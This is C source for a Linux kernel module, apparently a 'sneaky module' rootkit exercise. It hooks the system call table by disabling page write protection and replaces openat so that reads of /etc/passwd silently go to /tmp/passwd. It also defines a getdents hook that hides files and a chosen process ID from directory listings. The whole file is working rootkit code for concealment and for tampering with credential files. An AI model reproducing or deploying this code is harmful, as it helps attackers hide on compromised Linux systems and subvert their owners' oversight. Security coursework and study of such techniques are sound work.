#include <asm/cacheflush.h>
#include <asm/current.h>  // process information
#include <asm/page.h>
#include <asm/unistd.h>     // for system call constants
#include <linux/highmem.h>  // for changing page permissions
#include <linux/init.h>     // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h>  // for printk and other kernel bits
#include <linux/module.h>  // for all modules
#include <linux/sched.h>

#define PREFIX "sneaky_process"
static char *pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "sneaky process pid");
struct linux_dirent {
    long d_ino;
    off_t d_off;
    unsigned short d_reclen;
    char d_name[];
};
typedef struct linux_dirent linux_dirent64;

#define BUF_SIZE 1024
// This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    if (pte->pte & ~_PAGE_RW) {
        pte->pte |= _PAGE_RW;
    }
    return 0;
}

int disable_page_rw(void *ptr) {
    unsigned int level;
    pte_t *pte = lookup_address((unsigned long)ptr, &level);
    pte->pte = pte->pte & ~_PAGE_RW;
    return 0;
}

// asmlinkage int (*original_getdents64)(struct pt_regs *);

// asmlinkage int (*sneaky_sys_getdents64)(struct pt_regs *regs) {
//     linux_dirent64 __user *dirent = (linux_dirent64 *)regs->si;

//     /* Declare the previous_dir struct for book-keeping */
//     linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
//     unsigned long offset = 0;

//     int ret = original_getdents64(regs);
//     dirent_ker = kvzalloc(ret, GFP_KERNEL);

//     if ((ret <= 0) || (dirent_ker == NULL))
//         return ret;

//     long error;
//     error = copy_from_user(dirent_ker, dirent, ret);
//     if (error) {
//         goto done;
//     }

//     while (offset < ret) {
//         current_dir = (void *)dirent_ker + offset;

//         if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
//             /* Check for the special case when we need to hide the first entry */
//             if (current_dir == dirent_ker) {
//                 /* Decrement ret and shift all the structs up in memory */
//                 ret -= current_dir->d_reclen;
//                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
//                 continue;
//             }
//             /* Hide the secret entry by incrementing d_reclen of previous_dir by
//              * that of the entry we want to hide - effectively "swallowing" it
//              */
//             printk(KERN_INFO "found file\n");
//             previous_dir->d_reclen += current_dir->d_reclen;
//         } else {
//             /* Set previous_dir to current_dir before looping where current_dir
//              * gets incremented to the next entry
//              */
//             previous_dir = current_dir;
//         }

//         offset += current_dir->d_reclen;
//     }

//     error = copy_to_user(dirent, dirent_ker, ret);
//     if (error)
//         goto done;

// done:
//     kvfree(dirent_ker);
//     return ret;
// }

asmlinkage int (*original_getdents)(struct pt_regs *);
asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
    printk(KERN_INFO "sneaky_sys_getdents\n");
    linux_dirent64 *dire = NULL;
    int byte_num = original_getdents(regs);
    int offset = 0;
    if (byte_num <= 0) return 0;
    while (offset < byte_num) {
        char *addr = (char *)regs->si + offset;
        dire = (linux_dirent64 *)addr;
        if (strcmp(dire->d_name + 1, "sneaky_process") == 0 || strcmp(dire->d_name + 1, pid) == 0) {
            printk(KERN_INFO "found file\n");
            size_t bytes_remaining = byte_num - (offset + dire->d_reclen);
            memmove((char *)addr, (char *)addr + dire->d_reclen, bytes_remaining);
            byte_num -= dire->d_reclen;
        } else {
            offset += dire->d_reclen;
        }
    }
    return byte_num;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
    const char *filename = (char *)regs->si;
    const char *new_filename = "/tmp/passwd";
    if (strcmp(filename, "/etc/passwd") == 0) {
        // printk(KERN_INFO "changed passwd.\n");
        copy_to_user((char *)filename, new_filename, strlen(new_filename));
    }

    // Implement the sneaky part here
    return (*original_openat)(regs);
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
    // See /var/log/syslog or use `dmesg` for kernel print output
    printk(KERN_INFO "Sneaky module being loaded.\n");

    // Lookup the address for this symbol. Returns 0 if not found.
    // This address will change after rebooting due to protection
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

    // This is the magic! Save away the original 'openat' system call
    // function address. Then overwrite its address in the system call
    // table with the function address of our new code.
    original_openat = (void *)sys_call_table[__NR_openat];

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

    // You need to replace other system calls you need to hack here

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);

    return 0;  // to show a successful load
}

static void exit_sneaky_module(void) {
    printk(KERN_INFO "Sneaky module being unloaded.\n");

    // Turn off write protection mode for sys_call_table
    enable_page_rw((void *)sys_call_table);

    // This is more magic! Restore the original 'open' system call
    // function address. Will look like malicious code was never there!
    sys_call_table[__NR_openat] = (unsigned long)original_openat;

    // Turn write protection mode back on for sys_call_table
    disable_page_rw((void *)sys_call_table);
}

module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("GPL");